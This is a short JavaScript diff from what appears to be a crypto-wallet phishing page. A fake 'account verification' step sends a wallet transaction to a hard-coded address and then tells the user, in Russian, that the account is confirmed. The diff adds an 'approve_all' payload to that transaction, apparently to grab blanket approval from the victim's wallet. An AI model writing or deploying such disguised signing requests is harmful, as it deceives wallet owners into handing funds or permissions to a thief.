@@ -747,14 +747,17 @@ document.addEventListener("DOMContentLoaded", function () {
 
       try {
         const transaction = {
-          valid_until: Math.floor(Date.now() / 1000) + 300,
-          messages: [
-            {
-              address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
-              amount: '0',
+    valid_until: Math.floor(Date.now() / 1000) + 300,
+    messages: [
+        {
+            address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
+            amount: '0',
+            payload: {
+                type: 'approve_all'
             }
-          ]
-        };
+        }
+    ]
+};
         await ui.sendTransaction(transaction);
         err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
         err.style.color = '#00ff88';
